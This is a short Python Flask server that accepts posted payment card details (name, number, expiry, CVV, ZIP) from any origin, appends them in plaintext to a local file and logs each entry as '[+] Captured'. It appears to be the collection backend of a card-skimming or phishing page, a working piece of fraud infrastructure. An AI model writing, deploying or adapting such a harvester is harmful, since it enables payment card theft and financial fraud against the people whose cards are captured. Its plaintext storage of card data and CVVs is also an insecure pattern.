from flask import Flask, request, jsonify
from flask_cors import CORS
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

DATA_FILE = "card_data.txt"

@app.route("/submit", methods=["POST"])
def submit_data():
    data = request.get_json(silent=True) or {}

    cardname   = data.get("cardname")
    cardnumber = data.get("cardnumber")
    expiry     = data.get("expiry")
    cvv        = data.get("cvv")
    zip_code   = data.get("zip")

    if all([cardname, cardnumber, expiry, cvv, zip_code]):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(DATA_FILE, "a") as f:
            f.write(
                f"[{timestamp}] Name: {cardname} | "
                f"Card: {cardnumber} | Exp: {expiry} | "
                f"CVV: {cvv} | ZIP: {zip_code}\n"
            )
        print(f"[+] Captured: {cardname} / {cardnumber}")
        return jsonify({"message": "Data saved successfully"}), 200
    else:
        return jsonify({"message": "Invalid data"}), 400

if __name__ == "__main__":
    if not os.path.exists(DATA_FILE):
        open(DATA_FILE, "w").close()
    app.run(debug=True, port=8000)
